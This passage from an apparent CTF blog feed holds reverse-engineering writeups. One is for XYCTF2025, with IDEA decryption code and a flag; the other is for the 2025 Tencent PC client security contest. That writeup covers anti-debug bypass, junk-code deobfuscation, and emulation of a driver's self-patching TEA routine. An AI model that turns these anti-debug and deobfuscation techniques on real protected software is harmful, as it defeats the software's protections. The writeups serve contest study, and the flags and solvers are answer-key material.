class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后16字节进行IDEA解密</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0x2F</span>, <span class="number">0xD0</span>, <span class="number">0xEC</span>, <span class="number">0x82</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x9F</span>, <span class="number">0x91</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xA4</span>, <span class="number">0xAC</span>, <span class="number">0x90</span>&#125;;</span><br><span class="line">    <span class="comment">// unsigned int key[4] = &#123;</span></span><br><span class="line">    <span class="comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x6C98B242</span>, <span class="number">0x78563412</span>, <span class="number">0x3E6A6D0D</span>, <span class="number">0xEFCDAB89</span>&#125;;</span><br><span class="line"></span><br><span class="line">    code keys_input[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        keys_input[<span class="number">2</span> * i + <span class="number">1</span>] = key[i] &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        keys_input[<span class="number">2</span> * i] = (key[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> result[<span class="number">16</span>];</span><br><span class="line">    bitset&lt;64&gt; cipher1, cipher2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cipher1[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">            cipher2[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i + <span class="number">8</span>] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">subkeys_get</span>(keys_input);</span><br><span class="line">    <span class="built_in">inv_subkeys_get</span>(sub_key);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plain1 = <span class="built_in">dencrypt</span>(cipher1);</span><br><span class="line">    bitset&lt;64&gt; plain2 = <span class="built_in">dencrypt</span>(cipher2);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> plain1_val = plain<span class="number">1.</span><span class="built_in">to_ullong</span>();</span><br><span class="line">    <span class="type">uint64_t</span> plain2_val = plain<span class="number">2.</span><span class="built_in">to_ullong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> dec2[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2, &amp;plain2_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2 + <span class="number">8</span>, &amp;plain1_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(dec2, dec2 + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, dec2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{moshui_build_this_block}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF2025-逆向WP&quot;&gt;&lt;a href=&quot;#XYCTF2025-逆向WP&quot; class=&quot;headerlink&quot; title=&quot;XYCTF2025 逆向WP&quot;&gt;&lt;/a&gt;XYCTF2025 逆向WP&lt;/h1&gt;&lt;p&gt;虽然这次失去Web手，但是配合新来的师傅，小</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP</title>
    <link href="https://tkazer.github.io/2025/03/31/2025Tencent/"/>
    <id>https://tkazer.github.io/2025/03/31/2025Tencent/</id>
    <published>2025-03-31T10:30:26.000Z</published>
    <updated>2025-03-31T10:31:52.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP"><a href="#2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP" class="headerlink" title="2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP"></a>2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这也是本菜鸡第一次参加该比赛，之前是有看过前几年比赛的WP，感觉难度不小，这次来尝试一下，由于是纯CTF类型，做起来还算顺手，不过也是遇到不少问题。经过半天的奋战最后还是解了出来，综合体验下来收获还是不少的。</p><h2 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h2><p>将ACEFirstRound.exe放入IDA分析，在main函数可以看到一个虚表，根据里面各个函数内容，将每个虚表函数都重新命名为对应功能。</p><p>发现是运行了ACEDriver驱动，与r3程序之间进行通信。</p><p><img src="/2025/03/31/2025Tencent/1.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/2.png" alt="alt text"></p><p>尝试动调发现没办法，发现程序退出，根据CheckRemoteDebuggerPresent的交叉引用发现一个反调试函数。</p><p><img src="/2025/03/31/2025Tencent/3.png" alt="alt text"></p><p>找该函数的交叉调用，发现是这边启了一个线程来启动反调试。</p><p><img src="/2025/03/31/2025Tencent/4.png" alt="alt text"></p><p>在该函数这边进行条件断点，修改rip，让代码直接执行到函数结束处，跳过中间反调试相关代码，即可绕过反调试。</p><p><img src="/2025/03/31/2025Tencent/5.png" alt="alt text"></p><p>动调分析，然后这边输入flag要求是以”ACE_”开头，然后去掉前面这四个字符，首先进行Base58加密，然后再将数据倒转。这边Base58是变表，和标准不一样，提取得：<code>abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789</code></p><p><img src="/2025/03/31/2025Tencent/6.png" alt="alt text"></p><p>与”sxx”进行循环xor。</p><p><img src="/2025/03/31/2025Tencent/7.png" alt="alt text"></p><p>最后通信发送到ACEDriver，命令码是0x154004。</p><p><img src="/2025/03/31/2025Tencent/8.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/9.png" alt="alt text"></p><p>至此R3层分析完毕。</p><h2 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h2><p>IDA载入ACEDriver.sys，发现有几个消息的Callback，但是跳转过来发现有混淆和花指令。</p><p><img src="/2025/03/31/2025Tencent/10.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/11.png" alt="alt text"></p><p>该驱动的混淆和花指令都是一个类型的，花指令是最基础的。</p><p>以下图为例子：</p><p>对41e9按u再跳过e9字节按c还原，即可pass花指令。</p><p><img src="/2025/03/31/2025Tencent/12.png" alt="alt text"></p><p>然后截图处是一块，将地址计算完进行jmp，计算出来实际就是jmp到下面pop处，说明这一段是无用的，可以直接将push到pop全部nop即可。其他地方都和这地方混淆差不多类型，都直接跳过花指令后nop即可。</p><p><img src="/2025/03/31/2025Tencent/13.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/14.png" alt="alt text"></p><p>但有一种比较特殊，并不是跳转到下面邻近代码处，而是jmp到其他代码处，观察push和底下pop寄存器是否一致就可以判断是哪一种类型，该种就得手动计算地址然后写jmp。</p><p>手动去除大部分混淆后，就可以看到几个回调的里面代码，MessageNotifyCallback里面的代码如下：</p><p><img src="/2025/03/31/2025Tencent/15.png" alt="alt text"></p><p>进入几层call就可以看到这边就是判断命令码执行，下面就是接收R3发送来的密文数据。</p><p><img src="/2025/03/31/2025Tencent/16.png" alt="alt text"></p><p>进入call发现就是关键处，unk_140004064那边就是flag密文，使用的是tea加密，key是[‘A’,’C’,’E’,’6’]，然后边加密边判断密文是否相等。</p><p><img src="/2025/03/31/2025Tencent/17.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/18.png" alt="alt text"></p><p>查看tea函数的交叉调用，发现有其他地方有出现。</p><p><img src="/2025/03/31/2025Tencent/19.png" alt="alt text"></p><p>在第四个call处，发现一个函数传入了tea加密的函数地址，然后进行了一系列变换，应该是对tea函数本体进行了修改。</p><p><img src="/2025/03/31/2025Tencent/20.png" alt="alt text"></p><p>将该函数代码和相关数据进行提取，对tea函数字节进行本地模拟操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tea函数原字节</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tea[<span class="number">149</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x58</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x70</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xEA</span>, <span class="number">0x8B</span>, <span class="number">0x1A</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xDB</span>, <span class="number">0x8B</span>, <span class="number">0x7A</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0x8B</span>, <span class="number">0x72</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x6A</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x09</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x53</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xCA</span>, <span class="number">0x45</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0xB9</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x9E</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC2</span>, <span class="number">0x03</span>, <span class="number">0xCF</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xCD</span>, <span class="number">0x03</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0xBD</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> P_0[<span class="number">0x1000</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004000[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x41</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004010[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xC1</span>, <span class="number">0xE8</span>, <span class="number">0x0B</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x83</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0x44</span>, <span class="number">0x85</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004020[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004030[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004040[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x02</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> word_140004044[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004046[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> qword_140004048[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004050[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004054[<span class="number">1</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD64 qword_<span class="number">1400041E0</span> = <span class="number">0</span>;</span><br><span class="line">DWORD dword_<span class="number">1400041E8</span> = <span class="number">0</span>;</span><br><span class="line">BYTE byte_1400041EC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对tea函数修改的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_14000A35B</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n64; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">char</span>* v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v6; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v9; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64* v10; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v11; <span class="comment">// r8</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v12; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 CurrentIrql; <span class="comment">// dl</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v16; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    n64 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    v3 = (<span class="type">char</span>*)&amp;xmmword_140004020 + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">119</span>) &gt;&gt; i;</span><br><span class="line">        *v3++ = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = (<span class="type">char</span>*)&amp;xmmword_140004030 + <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">52</span>) &gt;&gt; j;</span><br><span class="line">        *v6++ = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = (<span class="type">char</span>*)&amp;qword_140004048 + <span class="number">3</span>;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)P_0;</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0, xmmword_140004000, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span>, xmmword_140004010, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span class="number">2</span>, xmmword_140004020, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span class="number">3</span>, xmmword_140004030, <span class="number">16</span>);</span><br><span class="line">    *((DWORD*)P_0 + <span class="number">16</span>) = *(DWORD*)dword_140004040;</span><br><span class="line">    *((WORD*)P_0 + <span class="number">34</span>) = *(WORD*)word_140004044;</span><br><span class="line">    *((BYTE*)P_0 + <span class="number">70</span>) = *(BYTE*)byte_140004046;</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int64)P_0;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v11 &gt;&gt; n64;</span><br><span class="line">        n64 += <span class="number">8</span>;</span><br><span class="line">        *v9++ = v12;</span><br><span class="line">    &#125; <span class="keyword">while</span> (n64 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    qword_<span class="number">1400041E0</span> = *(DWORD64*)(a1 + <span class="number">86</span>);</span><br><span class="line">    dword_<span class="number">1400041E8</span> = *(DWORD*)(a1 + <span class="number">94</span>);</span><br><span class="line">    byte_1400041EC = *(BYTE*)(a1 + <span class="number">98</span>);</span><br><span class="line">    *(DWORD64*)(a1 + <span class="number">86</span>) = *(DWORD64*)qword_140004048;</span><br><span class="line">    *(DWORD*)(a1 + <span class="number">94</span>) = *(DWORD*)dword_140004050;</span><br><span class="line">    *(BYTE*)(a1 + <span class="number">98</span>) = *(BYTE*)byte_140004054;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 修改tea加密函数代码字节</span></span><br><span class="line">    <span class="built_in">sub_14000A35B</span>((<span class="type">long</span> <span class="type">long</span>)tea);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译使用IDA动调，并按c分析tea数组处的代码，发现分成了三块，手动将三块合并到一块代码，并修复部分跳转的地址，即可得到完整的代码。</p><p><img src="/2025/03/31/2025Tencent/21.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/22.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/23.png" alt="alt text"></p><p>合并完的代码如下：</p><p><img src="/2025/03/31/2025Tencent/24.png" alt="alt text"></p><p>反编译得到修改后的魔改tea加密</p><p><img src="/2025/03/31/2025Tencent/25.png" alt="alt text"></p><p>即可编写得到对应的解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* Input, <span class="type">int</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// sum从32开始</span></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行对unk_140004064密文解密即可，不过注意一点，这边是从-1处开始判断，也就是unk_140004064-4处开始是密文。</p><p><img src="/2025/03/31/2025Tencent/26.png" alt="alt text"></p><p>提取出来就是42的DWORD数据，和上面的判断数值对应上了。</p><p><img src="/2025/03/31/2025Tencent/27.png" alt="alt text"></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 